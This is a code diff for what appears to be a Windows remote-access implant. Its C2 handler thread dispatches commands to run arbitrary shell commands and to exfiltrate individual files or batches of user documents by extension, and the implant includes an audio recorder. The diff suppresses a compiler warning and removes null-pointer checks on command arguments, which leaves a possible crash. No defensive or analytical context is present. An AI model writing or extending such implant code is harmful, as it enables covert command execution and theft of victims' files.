@@ -5,6 +5,9 @@
 #include <string.h>
 #include <time.h>
 
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wformat-truncation"
+
 #include "dynamic_linking.h"
 #include "base64.c"
 #include "audio_recorder.c"
@@ -322,7 +325,7 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
             break;
         case CMD_EXECUTE:
             // Use command args if provided, otherwise use default
-            if (data->args && strlen(data->args) > 0) {
+            if (strlen(data->args) > 0) {
                 output = executeCommandWithOutput(data->args);
                 if (!output) {
                     output = strdup("failed to execute");
@@ -340,7 +343,7 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
             break;
         case CMD_FILE_EXFILTRATE:
             // Use filepath from args
-            if (data->args && strlen(data->args) > 0) {
+            if (strlen(data->args) > 0) {
                 output = exfiltrate_file(data->args);
                 if (!output) {
                     output = strdup("failed to exfiltrate file");
@@ -352,7 +355,7 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
             break;
         case CMD_FILE_EXFILTRATE_BATCH:
             // Use extensions from args (format: ".pdf,.docx" or "C:\\path|.pdf,.docx")
-            if (data->args && strlen(data->args) > 0) {
+            if (strlen(data->args) > 0) {
                 output = exfiltrate_user_files_by_extension(data->args);
                 if (!output) {
                     output = strdup("failed to exfiltrate files");
@@ -470,5 +473,7 @@ int start_c2_handler() {
     }
     
     CloseHandle(hThread);
+    
+#pragma GCC diagnostic pop
     return 1;
 }
